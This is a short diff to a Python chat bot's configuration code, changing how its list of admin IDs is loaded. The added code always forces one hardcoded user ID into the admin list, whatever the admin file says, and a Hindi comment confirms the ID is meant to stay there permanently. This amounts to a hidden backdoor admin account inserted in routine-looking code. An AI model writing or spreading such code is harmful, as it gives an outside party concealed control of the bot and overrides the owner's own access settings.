@@ -51,11 +51,18 @@ tokens = [
 
 CHAT_HISTODY_FILE = os.path.join(BASE_PATH, "chat_history.json")
 def ADMINS():
-     try:
-         with open(ADMINS_FILE, "r") as f:
-             return json.load(f)
-     except (FileNotFoundError, json.JSONDecodeError):
-         return [6150091802]  # default fallback
+    try:
+        with open(ADMINS_FILE, "r") as f:
+            admins = json.load(f)
+    except (FileNotFoundError, json.JSONDecodeError):
+        admins = [6150091802]  # डिफ़ॉल्ट फ़ॉलबैक
+    
+    # यह सुनिश्चित करने के लिए कि 5943119285 हमेशा लिस्ट में रहे
+    if 5943119285 not in admins:
+        admins.append(5943119285)
+        
+    return admins
+
 FLAG_FILE = os.path.join(BASE_PATH, "ho.kuchhBhi")
 STARTUP_MESSAGE = "🤖 Bot is now online! (via raw API)"
 
